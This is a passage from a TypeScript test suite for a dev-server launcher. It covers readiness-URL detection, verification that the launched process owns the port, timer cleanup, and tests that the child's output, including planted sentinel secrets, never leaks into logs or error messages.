      command: `pnpm run ${DEFAULT_SCRIPT.name}`,
    });

    expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'script-not-declared');
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });
});

/** The warn record a `ready-unverified` failure logs. */
const UNVERIFIED_RECORD =
  'The launched dev server answered but was never identified; it was stopped';

/**
 * Lines that announce a serving address the way real dev servers do — each
 * loopback URL right after a serving-address label — and the candidate each
 * one yields.
 */
const ANNOUNCEMENT_LINES: readonly {
  readonly label: string;
  readonly line: string;
  readonly candidate: string;
}[] = [
  {
    label: 'Next.js 16 (- Local:)',
    line: '   - Local:         http://127.0.0.1:4173',
    candidate: 'http://127.0.0.1:4173/',
  },
  {
    label: 'Next.js 12/13 (url:)',
    line: 'ready - started server on 0.0.0.0:4173, url: http://localhost:4173',
    candidate: 'http://localhost:4173/',
  },
  {
    label: 'Vite (➜  Local:)',
    line: '  ➜  Local:   http://localhost:4173/',
    candidate: 'http://localhost:4173/',
  },
  {
    label: 'a Node server (listening on)',
    line: 'Server listening on http://localhost:4173',
    candidate: 'http://localhost:4173/',
  },
  {
    label: 'a Node server (running at)',
    line: 'Server running at http://localhost:4173/',
    candidate: 'http://localhost:4173/',
  },
  {
    label: 'the integration stand-in (Local:)',
    line: 'Local: http://127.0.0.1:4173',
    candidate: 'http://127.0.0.1:4173/',
  },
  {
    label: 'an IPv6 loopback (ready on)',
    line: 'ready on http://[::1]:4173',
    candidate: 'http://[::1]:4173/',
  },
];

/**
 * Lines with a loopback URL that no serving-address label introduces: the
 * verifier's database link, a `Network:` address, error-line links, a label
 * earlier on the line than the text right before the URL, a negated label, a
 * label inside an earlier URL, a request log and a label-shaped identifier.
 */
const UNANNOUNCED_LINES: readonly string[] = [
  'database is not ready; see http://localhost:4173/docs',
  '   - Network:       http://127.0.0.1:4173',
  "prisma:error Can't reach database server at http://localhost:4173",
  'Error: connect ECONNREFUSED http://127.0.0.1:4173',
  'Server listening for requests; see http://localhost:4173 for the docs',
  'database is not ready: http://localhost:4173',
  'cache: see http://127.0.0.1:6379/ready http://localhost:4173',
  'GET http://localhost:4173/api/mock 200 in 12ms',
  'proxy target localhost:4173 is http://localhost:4173',
  'readyState: http://localhost:4173',
];

/** A probe that answers everywhere with the Next.js signature, as a host full of Next.js servers would. */
const answersEverywhereSigned: ProbeFn = (url) => Promise.resolve(probeAnswer(url, true, 'next'));

describe('DevServerLauncher.launch: readiness candidates (strict announcements)', () => {
  it.each(ANNOUNCEMENT_LINES)(
    'takes the URL a serving-address label introduces as a candidate: $label',
    async ({ line, candidate }) => {
      const harness = createHarness();
      const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
      const child = await spawnedChild(harness, pending);

      child.print(`${line}\n`);
      const launch = expectOk(await pending);

      expect(launch).toMatchObject({ managed: true, devServerUrl: candidate, pid: FIRST_PID });
      expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([candidate]);
      expect(harness.ownership.mock.calls).toEqual([[FIRST_PID, 4173]]);
    },
  );

  it.each(UNANNOUNCED_LINES)(
    'never makes a candidate of a loopback URL no serving-address label introduces: %s',
    async (line) => {
      vi.useFakeTimers();
      // The worst host: every address answers signed and every port is "owned".
      const harness = createHarness({
        probe: answersEverywhereSigned,
        ownership: () => Promise.resolve(true),
        deps: { readyTimeoutMs: 1_000 },
      });
      const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
      const child = await spawnedChild(harness, pending);

      child.print(`${line}\n`);
      await vi.advanceTimersByTimeAsync(1_000);
      const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');

      expect(harness.probe).not.toHaveBeenCalled();
      expect(harness.ownership).not.toHaveBeenCalled();
      expect(error.details).not.toHaveProperty('lastSeenUrl');
      expect(child.signals).toEqual(['SIGTERM']);
      expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
      expect(vi.getTimerCount()).toBe(0);
    },
  );

  it('never binds the verifier’s case: a database link while an unrelated Next.js server holds that port', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: scriptedProbe({ 'http://localhost:4173': 'next' }),
      ownership: ownershipByPort({ 4173: false }),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print('database is not ready; see http://localhost:4173/docs\n', 'stderr');
    await vi.advanceTimersByTimeAsync(1_000);
    const result = await pending;

    expect(isOk(result)).toBe(false);
    expectErr(result, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');
    expect(harness.probe).not.toHaveBeenCalled();
    expect(harness.launcher.list()).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('never makes the service’s own port a candidate, even after a serving-address label', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ deps: { readyTimeoutMs: 1_000 } });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`ready - listening on http://127.0.0.1:${String(SERVICE_CONFIG.port)}\n`);
    await vi.advanceTimersByTimeAsync(1_000);

    expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');
    expect(harness.probe).not.toHaveBeenCalled();
    expect(vi.getTimerCount()).toBe(0);
  });

  it('keeps at most MAX_READY_CANDIDATES distinct candidates, in announcement order', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: (url) => Promise.resolve(probeAnswer(url, false)),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const origins = Array.from(
      { length: MAX_READY_CANDIDATES + 3 },
      (_, offset) => `http://127.0.0.1:${String(5_000 + offset)}`,
    );

    for (const origin of origins) {
      child.print(`ready - listening on ${origin}\n`);
    }
    child.print(`ready - listening on ${origins[0] ?? ''}\n`);
    await vi.advanceTimersByTimeAsync(300);

    const probed = [...new Set(harness.probe.mock.calls.map(([url]) => url))];
    expect(probed).toEqual(origins.slice(0, MAX_READY_CANDIDATES).map((origin) => `${origin}/`));
    await vi.advanceTimersByTimeAsync(700);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');
    expect(error.details?.['lastSeenUrl']).toBe(`${origins[0] ?? ''}/`);
    expect(vi.getTimerCount()).toBe(0);
  });
});

/**
 * Asserts, under fake timers, that the only timer a ready launch left behind is
 * its credential lease's renewal, and that it goes with the child: one timer,
 * which fires as a renewal one renewal interval later and re-arms itself, and
 * none once `stop` has settled. A readiness poll, deadline or ownership bound
 * that outlived the launch would fail the first count, fire without a renewal,
 * or survive the stop.
 */
async function expectOnlyTheLeaseTimer(harness: Harness): Promise<void> {
  expect(vi.getTimerCount()).toBe(1);
  expect(harness.issuer.renew).not.toHaveBeenCalled();

  await vi.advanceTimersByTimeAsync(
    Math.floor(DEFAULT_MANAGED_CREDENTIAL_LEASE_MS / LEASE_RENEWALS_PER_LEASE),
  );
  expect(harness.issuer.renew).toHaveBeenCalledTimes(1);
  expect(vi.getTimerCount()).toBe(1);

  const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
  await vi.advanceTimersByTimeAsync(0);
  expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
  expect(vi.getTimerCount()).toBe(0);
}

describe('DevServerLauncher.launch: readiness verification (listener ownership)', () => {
  it('stays pending while the announced address refuses, until the child’s own listener answers (address printed before the listener binds)', async () => {
    vi.useFakeTimers();
    let probes = 0;
    const harness = createHarness({
      probe: (url) => {
        probes += 1;
        return Promise.resolve(probeAnswer(url, probes >= 4, 'next'));
      },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    let settled = false;
    void pending.then(() => {
      settled = true;
    });

    child.print(`  - Local:   ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(0);
    expect(probes).toBe(1);
    expect(settled).toBe(false);

    await vi.advanceTimersByTimeAsync(200);
    expect(probes).toBe(3);
    expect(settled).toBe(false);
    expect(harness.launcher.list()).toMatchObject([{ status: 'starting' }]);
    // Nothing answered yet, so the operating system was never asked.
    expect(harness.ownership).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(100);
    const launch = expectOk(await pending);

    expect(launch).toMatchObject({ managed: true, devServerUrl: DEV_URL, pid: FIRST_PID });
    expect(probes).toBe(4);
    expect(new Set(harness.probe.mock.calls.map(([url]) => url))).toEqual(new Set([DEV_URL]));
    expect(harness.ownership.mock.calls).toEqual([[FIRST_PID, portOf(DEV_ORIGIN)]]);
    expect(child.signals).toEqual([]);
    await expectOnlyTheLeaseTimer(harness);
  });

  it('becomes ready once a listener announced early binds and is owned, with no framework signature at all (QA: print, then bind)', async () => {
    vi.useFakeTimers();
    let bound = false;
    const harness = createHarness({
      // Unsigned answers: identity never comes from a response header.
      probe: (url) => Promise.resolve(probeAnswer(url, bound)),
      ownership: (_rootPid, port) => Promise.resolve(bound && port === portOf(DEV_ORIGIN)),
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    let settled = false;
    void pending.then(() => {
      settled = true;
    });

    child.print(`Local: ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(300);
    expect(settled).toBe(false);
    expect(harness.ownership).not.toHaveBeenCalled();

    bound = true;
    await vi.advanceTimersByTimeAsync(100);
    const launch = expectOk(await pending);

    expect(launch).toMatchObject({ managed: true, devServerUrl: DEV_URL, pid: FIRST_PID });
    expect(harness.ownership.mock.calls).toEqual([[FIRST_PID, portOf(DEV_ORIGIN)]]);
    const ready = harness.records.find(
      (record) => record.message === 'The launched dev server is ready',
    );
    expect(ready?.fields['identifiedBy']).toBe('launched-child');
    expect(ready?.fields).not.toHaveProperty('framework');
    expect(child.signals).toEqual([]);
    await expectOnlyTheLeaseTimer(harness);
  });

  it('keeps the first candidate for the diagnostics of a timeout in which no address answered', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: (url) => Promise.resolve(probeAnswer(url, false)),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`  - Local:   ${DEV_ORIGIN}\n`);
    child.print('ready on http://127.0.0.1:4174\n');
    await vi.advanceTimersByTimeAsync(1_000);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');

    expect(error.hint).toContain('It never announced a local address that answered.');
    expect(error.details).toStrictEqual({
      reason: 'ready-timeout',
      timeoutMs: 1_000,
      lastSeenUrl: DEV_URL,
      output: { stdoutLines: 2, stderrLines: 0, diagnostics: [] },
    });
    expect(
      harness.records.find(
        (record) =>
          record.message === 'The launched dev server did not become ready in time; it was stopped',
      )?.fields['candidateCount'],
    ).toBe(2);
    expect(harness.ownership).not.toHaveBeenCalled();
    expect(child.signals).toEqual(['SIGTERM']);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('stops a child whose announced address is answered by an unrelated signed Next.js listener (ready-unverified, other-process), revoking once and leaving no timer', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      // The answer carries the Next.js signature — another project's server.
      probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
      ownership: ownershipByPort({ [portOf(DEV_ORIGIN)]: false }),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const sentinels = sentinelOutput(harness.issuer.tokens[0] ?? '');
    let settled = false;
    void pending.then(() => {
      settled = true;
    });

    child.print(sentinels.stdout);
    child.print(`  - Local:   ${DEV_ORIGIN}\n`);
    child.print(sentinels.stderr, 'stderr');
    await vi.advanceTimersByTimeAsync(999);
    expect(settled).toBe(false);
    expect(child.signals).toEqual([]);

    await vi.advanceTimersByTimeAsync(1);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

    expect(error.message).toBe(
      "The dev server's announced address answered within 1 s, but the process listening there is not the dev server this launch started, so the launched dev server was stopped.",
    );
    expect(error.hint).toBe(
      'Another process answers at that address. Stop it, or change the port the dev server listens on, then launch the dev server again. Run the dev script in a terminal to read its full output.',
    );
    expect(error.details).toStrictEqual({
      reason: 'ready-unverified',
      timeoutMs: 1_000,
      candidates: [DEV_URL],
      ownership: 'other-process',
      output: { stdoutLines: 4, stderrLines: 2, diagnostics: [] },
    });
    expectNoOutputLeak(harness, error, sentinels.fragments);
    const record = harness.records.find((entry) => entry.message === UNVERIFIED_RECORD);
    expect(record?.level).toBe('warn');
    expect(record?.fields).toStrictEqual({
      subsystem: 'dev-server',
      projectRoot: harness.projectRoot,
      pid: FIRST_PID,
      timeoutMs: 1_000,
      candidates: [DEV_URL],
      ownership: 'other-process',
      output: { stdoutLines: 4, stderrLines: 2, truncatedLines: 0, diagnostics: [] },
    });
    expect(
      harness.records.find((entry) => entry.message === 'Stopped a launched dev server')?.fields[
        'reason'
      ],
    ).toBe('ready-unverified');
    expect(harness.ownership.mock.calls.length).toBeGreaterThan(1);
    expect(
      harness.ownership.mock.calls.every(
        ([pid, port]) => pid === FIRST_PID && port === portOf(DEV_ORIGIN),
      ),
    ).toBe(true);
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('reports ownership the lookup could not determine as ready-unverified "unknown", with its own fixed hint', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
      ownership: () => Promise.resolve(undefined),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`  - Local:   ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(1_000);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

    expect(error.message).toBe(
      "The dev server's announced address answered within 1 s, but the service could not determine which process listens there, so the launched dev server was stopped.",
    );
    expect(error.hint).toBe(
      'The service could not determine which process listens at that address. Start the dev server yourself with the Debug Generator preload, then set debuggen.devServerUrl to its local address. Run the dev script in a terminal to read its full output.',
    );
    expect(error.details).toStrictEqual({
      reason: 'ready-unverified',
      timeoutMs: 1_000,
      candidates: [DEV_URL],
      ownership: 'unknown',
      output: { stdoutLines: 1, stderrLines: 0, diagnostics: [] },
    });
    expect(
      harness.records.find((entry) => entry.message === UNVERIFIED_RECORD)?.fields['ownership'],
    ).toBe('unknown');
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('reports "other-process" when another process held the port in one round and the lookup could not tell in another', async () => {
    vi.useFakeTimers();
    const verdicts: (boolean | undefined)[] = [undefined, false];
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'unsigned' }),
      ownership: () => Promise.resolve(verdicts.length > 0 ? verdicts.shift() : undefined),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`Local: ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(1_000);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

    expect(error.details?.['ownership']).toBe('other-process');
    expect(vi.getTimerCount()).toBe(0);
  });

  it('never counts a connected server-agent as the child: a signed answer from another process stays unverified', async () => {
    vi.useFakeTimers();
    const hasServerAgentForProject = vi.fn<(projectRoot: string) => boolean>(() => true);
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
      ownership: ownershipByPort({ [portOf(DEV_ORIGIN)]: false }),
      deps: { readyTimeoutMs: 1_000, detectDeps: { serverAgents: { hasServerAgentForProject } } },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`Local: ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(1_000);

    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');
    expect(error.details?.['ownership']).toBe('other-process');
    // Readiness never asks the registry: presence is per project, not per port.
    expect(hasServerAgentForProject).not.toHaveBeenCalled();
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('picks the first owned target in target order, whatever the signatures say', async () => {
    const harness = createHarness({
      probe: scriptedProbe({
        'http://127.0.0.1:4000': 'next',
        'http://localhost:4173': 'unsigned',
      }),
      ownership: ownershipByPort({ 4000: false, 4173: true }),
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(
      'ready - api listening on http://127.0.0.1:4000, app available at http://localhost:4173\n',
    );
    const launch = expectOk(await pending);

    expect(launch.devServerUrl).toBe('http://localhost:4173/');
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([
      'http://127.0.0.1:4000/',
      'http://localhost:4173/',
    ]);
    expect(harness.ownership.mock.calls.map(([, port]) => port).sort()).toEqual([4000, 4173]);
  });

  it('picks the first target when the child owns several, in announcement order', async () => {
    const harness = createHarness({
      probe: scriptedProbe({
        'http://127.0.0.1:4000': 'unsigned',
        'http://localhost:4173': 'next',
      }),
      ownership: ownershipByPort({ 4000: true, 4173: true }),
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(
      'ready - api listening on http://127.0.0.1:4000, app available at http://localhost:4173\n',
    );

    expect(expectOk(await pending).devServerUrl).toBe('http://127.0.0.1:4000/');
  });

  it('verifies a candidate announced mid-round at once, and picks it when it alone is owned', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: scriptedProbe({
        'http://127.0.0.1:4000': 'unsigned',
        'http://localhost:4173': 'unsigned',
      }),
      ownership: ownershipByPort({ 4000: false, 4173: true }),
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print('mock api available at http://127.0.0.1:4000\n');
    child.print('  - Local:   http://localhost:4173\n');
    // No timer advanced: the second announcement started a round of its own.
    const launch = expectOk(await pending);

    expect(launch.devServerUrl).toBe('http://localhost:4173/');
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([
      'http://127.0.0.1:4000/',
      'http://127.0.0.1:4000/',
      'http://localhost:4173/',
    ]);
    await expectOnlyTheLeaseTimer(harness);
  });

  it('requires ownership on the requested-URL path too: an answer there from another process is never ready', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
      ownership: ownershipByPort({ [portOf(DEV_ORIGIN)]: false }),
      deps: { readyTimeoutMs: 1_000 },
    });
    const pending = harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: DEV_URL,
    });
    const child = await spawnedChild(harness, pending);

    await vi.advanceTimersByTimeAsync(1_000);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

    expect(error.message).toBe(
      "The session's dev-server address answered within 1 s, but the process listening there is not the dev server this launch started, so the launched dev server was stopped.",
    );
    expect(error.details).toStrictEqual({
      reason: 'ready-unverified',
      timeoutMs: 1_000,
      candidates: [DEV_URL],
      ownership: 'other-process',
      output: { stdoutLines: 0, stderrLines: 0, diagnostics: [] },
    });
    expect(harness.probe.mock.calls.length).toBeGreaterThan(1);
    expect(harness.probe.mock.calls.every(([url]) => url === DEV_URL)).toBe(true);
    expect(child.signals).toEqual(['SIGTERM']);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('probes the requested URL after the candidates — once, when it names a candidate', async () => {
    const harness = createHarness();

    await launchReady(harness, { devServerUrl: DEV_URL });

    // Before the announcement the requested URL is the only target (and does
    // not answer yet); afterwards it is the announced candidate, probed once.
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([DEV_URL, DEV_URL]);
  });

  it('tries the requested URL last, and is ready there when only its port is the child’s', async () => {
    vi.useFakeTimers();
    const requested = `${DEV_ORIGIN}/catalog`;
    // The requested port becomes the child's only once it announces; the
    // announced 4174 is another process's throughout.
    let announced = false;
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'unsigned', 'http://127.0.0.1:4174': 'next' }),
      ownership: (_rootPid, port) => Promise.resolve(port === 4174 ? false : announced),
    });
    const pending = harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: requested,
    });
    const child = await spawnedChild(harness, pending);
    await vi.advanceTimersByTimeAsync(0);
    expect(harness.probe.mock.calls.map(([url]) => url)).toEqual([requested]);

    announced = true;
    child.print('  - Local:   http://127.0.0.1:4174\n');
    const launch = expectOk(await pending);

    expect(launch.devServerUrl).toBe(requested);
    expect(harness.probe.mock.calls.slice(-2).map(([url]) => url)).toEqual([
      'http://127.0.0.1:4174/',
      requested,
    ]);
    expect(
      harness.ownership.mock.calls
        .slice(-2)
        .map(([, port]) => port)
        .sort(),
    ).toEqual([4173, 4174]);
    await expectOnlyTheLeaseTimer(harness);
  });

  const failingOwnership: readonly {
    readonly label: string;
    readonly ownsListener: OwnsListenerFn;
  }[] = [
    {
      label: 'throws synchronously',
      ownsListener: () => {
        throw new Error('lookup exploded');
      },
    },
    { label: 'rejects', ownsListener: () => Promise.reject(new Error('lookup failed')) },
    {
      label: 'answers something other than a boolean',
      ownsListener: () => Promise.resolve('yes' as unknown as boolean),
    },
  ];

  it.each(failingOwnership)(
    'reads an ownership port that $label as "cannot tell", never as a failure',
    async ({ ownsListener }) => {
      vi.useFakeTimers();
      const harness = createHarness({
        probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
        ownership: ownsListener,
        deps: { readyTimeoutMs: 1_000 },
      });
      const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
      const child = await spawnedChild(harness, pending);

      child.print(`Local: ${DEV_ORIGIN}\n`);
      await vi.advanceTimersByTimeAsync(1_000);
      const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

      expect(error.details?.['ownership']).toBe('unknown');
      expect(
        harness.records.some(
          (record) => record.message === 'A dev-server readiness round failed unexpectedly',
        ),
      ).toBe(false);
      expect(child.signals).toEqual(['SIGTERM']);
      expect(vi.getTimerCount()).toBe(0);
    },
  );

  it('bounds an ownership lookup that never answers by the readiness probe timeout, and leaves no timer when the wait ends', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      probe: scriptedProbe({ [DEV_ORIGIN]: 'next' }),
      ownership: () => new Promise<boolean | undefined>(() => undefined),
      deps: { readyTimeoutMs: 1_000, readyProbeTimeoutMs: 200 },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`Local: ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(199);
    expect(harness.probe).toHaveBeenCalledTimes(1);
    expect(harness.ownership).toHaveBeenCalledTimes(1);

    // The bound releases the round at 200 ms; the next poll probes again.
    await vi.advanceTimersByTimeAsync(101);
    expect(harness.probe).toHaveBeenCalledTimes(2);
    expect(harness.ownership).toHaveBeenCalledTimes(2);

    await vi.advanceTimersByTimeAsync(700);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-unverified');

    expect(error.details?.['ownership']).toBe('unknown');
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    // The ask still pending at the deadline was released with its bound timer.
    expect(vi.getTimerCount()).toBe(0);
  });

  it('treats a probe that throws as no answer and keeps verifying', async () => {
    vi.useFakeTimers();
    let probes = 0;
    const harness = createHarness({
      probe: (url) => {
        probes += 1;
        if (probes < 3) {
          return Promise.reject(new Error('probe transport failed'));
        }
        return Promise.resolve(probeAnswer(url, true, 'next'));
      },
    });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);

    child.print(`  - Local:   ${DEV_ORIGIN}\n`);
    await vi.advanceTimersByTimeAsync(200);

    expect(expectOk(await pending)).toMatchObject({ devServerUrl: DEV_URL });
    expect(probes).toBe(3);
    await expectOnlyTheLeaseTimer(harness);
  });

  const probeTimeoutCases: readonly {
    readonly label: string;
    readonly deps: Partial<DevServerLauncherDeps>;
    readonly expected: number;
  }[] = [
    {
      label: 'the readiness default',
      deps: { readyTimeoutMs: 60_000 },
      expected: DEFAULT_READY_PROBE_TIMEOUT_MS,
    },
    {
      label: 'an injected timeout',
      deps: { readyTimeoutMs: 60_000, readyProbeTimeoutMs: 750 },
      expected: 750,
    },
    {
      label: 'a timeout clamped to the ready timeout',
      deps: { readyTimeoutMs: 2_000, readyProbeTimeoutMs: 9_000 },
      expected: 2_000,
    },
    {
      label: 'the default for a non-positive value',
      deps: { readyTimeoutMs: 60_000, readyProbeTimeoutMs: 0 },
      expected: DEFAULT_READY_PROBE_TIMEOUT_MS,
    },
  ];

  it.each(probeTimeoutCases)(
    'probes readiness with $label, never detection’s probe timeout',
    async ({ deps, expected }) => {
      const harness = createHarness({ deps: { ...deps, detectDeps: { probeTimeoutMs: 123 } } });

      await launchReady(harness);

      expect(harness.probe.mock.calls.map(([, probeDeps]) => probeDeps?.probeTimeoutMs)).toEqual([
        expected,
      ]);
    },
  );
});

// ---------------------------------------------------------------------------
// Child output privacy (CWE-532): digested, never logged, kept or returned
// ---------------------------------------------------------------------------

/**
 * Lines a real dev server prints that carry developer data, each holding one
 * distinctive fragment: a source code frame, a SQL literal, a URL query value,
 * an email address and the planted credential. None is a loopback address,
 * so none of them can make a child "ready".
 */
function sentinelOutput(token: string): {
  readonly stdout: string;
  readonly stderr: string;
  readonly fragments: readonly string[];
} {
  const codeFrame = 'marginFloor = ledgerTotals';
  const sqlLiteral = ['quarterly', 'close', 'sentinel'].join('-');
  const queryValue = ['acct', 'sentinel', '4417'].join('-');
  const email = ['jordan.sentinel', 'example.test'].join('@');
  return {
    stdout: [
      `> 27 |   const ${codeFrame}.reduce(sumCents, 0) * 0.37;`,
      `prisma:query SELECT "id" FROM "Invoice" WHERE "memo" = '${sqlLiteral}' LIMIT 1`,
      `GET https://statements.example.test/v1/export?account=${queryValue} 200 in 41ms`,
      '',
    ].join('\n'),
    stderr: [`notify: sent receipt to ${email}`, `${PRELOAD_ENV_KEYS.token}=${token}`, ''].join(
      '\n',
    ),
    fragments: [codeFrame, sqlLiteral, queryValue, email, token],
  };
}

/** Every fragment is absent from every log record and from every surface of `error`. */
function expectNoOutputLeak(
  harness: Harness,
  error: DebuggenError,
  fragments: readonly string[],
): void {
  const logged = serializedRecords(harness.records);
  const surfaced = errorSurfaces(error);
  for (const fragment of fragments) {
    expect(fragment.length).toBeGreaterThan(0);
    expect(logged).not.toContain(fragment);
    expect(surfaced).not.toContain(fragment);
  }
  // No record is a relay of child output, at any level, under any field.
  expect(harness.records.some((record) => record.message === 'dev-server output')).toBe(false);
  expect(harness.records.some((record) => Object.hasOwn(record.fields, 'line'))).toBe(false);
  expect(error.details).not.toHaveProperty('outputTail');
  expect(error.hint).not.toContain('Last output');
}

/** The `output` field of the first record with `message`. */
function loggedOutput(harness: Harness, message: string): unknown {
  return harness.records.find((record) => record.message === message)?.fields['output'];
}

describe('DevServerLauncher.launch: child output privacy (CWE-532)', () => {
  it('keeps every sentinel out of the logs and the error of a child that exits 1', async () => {
    const harness = createHarness();
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const sentinels = sentinelOutput(harness.issuer.tokens[0] ?? '');

    child.print(sentinels.stdout);
    child.print(sentinels.stderr, 'stderr');
    child.finish(1, null);
    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'exited-before-ready');

    expectNoOutputLeak(harness, error, sentinels.fragments);
    expect(error.details?.['output']).toStrictEqual({
      stdoutLines: 3,
      stderrLines: 2,
      diagnostics: [],
    });
    expect(error.hint).toBe(
      'Fix the problem that stopped it (a missing dependency, a port in use, a build error), then launch the dev server again. Run the dev script in a terminal to read its full output.',
    );
  });

  it('keeps every sentinel out of the logs and the error of a child that never becomes ready', async () => {
    vi.useFakeTimers();
    const harness = createHarness({ deps: { readyTimeoutMs: 1_000 } });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const sentinels = sentinelOutput(harness.issuer.tokens[0] ?? '');

    child.print(sentinels.stdout);
    child.print(sentinels.stderr, 'stderr');
    child.print(`${'x'.repeat(2_400)}\n`);
    await vi.advanceTimersByTimeAsync(1_000);
    const error = expectErr(await pending, 'DEV_SERVER_UNAVAILABLE', 'ready-timeout');

    expectNoOutputLeak(harness, error, sentinels.fragments);
    expect(error.details).toStrictEqual({
      reason: 'ready-timeout',
      timeoutMs: 1_000,
      output: { stdoutLines: 4, stderrLines: 2, diagnostics: [] },
    });
    expect(error.hint).toContain('Run the dev script in a terminal to read its full output.');
    expect(
      loggedOutput(harness, 'The launched dev server did not become ready in time; it was stopped'),
    ).toStrictEqual({ stdoutLines: 4, stderrLines: 2, truncatedLines: 1, diagnostics: [] });
    expect(vi.getTimerCount()).toBe(0);
  });

  it('keeps every sentinel out of the logs and the error of a command that fails to spawn', async () => {
    const harness = createHarness({ children: [{ pid: null }] });
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
